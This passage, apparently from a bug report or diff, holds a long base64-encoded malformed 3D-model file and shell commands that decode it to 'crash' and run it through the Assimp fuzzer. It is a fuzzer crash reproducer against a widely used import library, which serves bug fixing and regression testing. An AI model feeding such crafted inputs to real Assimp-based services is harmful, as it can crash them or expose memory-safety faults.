+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6uoV6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6ury6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6uvq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6unq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urqSEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhI
+SEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhI
+SEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhI
+SEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhI
+SEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhI
+SEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhI
+SEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhI
+SEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhI
+SEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhI
+SEhIT1JEIiAgOCAgICAgNTU1NTU1NTU1NSA3ICAgICA1NTU1NTU1NDU1CQCATElHSFRPQi9FQ1R0
+dDEwABBNDAxEAEVSgEQ1VlNIDQ0yKg0gMiA3SEhISEhISEhISEhISEhISEhISEhISEhISEhISEhI
+SEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhI
+SEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISHkgCQkJCXttf0Q1VgoKVgrJycnJycnJ
+ycnJycnJycnJycnJycnJycnJTWPpAGX6AABoDER/NjVWCgEKZAAAZXlWLFdJQUxfCgpWClYQTQxN
+RVNIJkR/RYIAAGV5VixXSUEAAFYQTQwMZABEIkNIT1JEIiAFICAgICAgNTU1NTU1NTU1NSA3ICAg
+ICA1NTU1NTU1NTU1IDcgICAgIAkJAIBMSUdIVE9CL0VDVHR0MTAA" | base64 -d > crash
+
+./assimp_fuzzer ./crash
+```
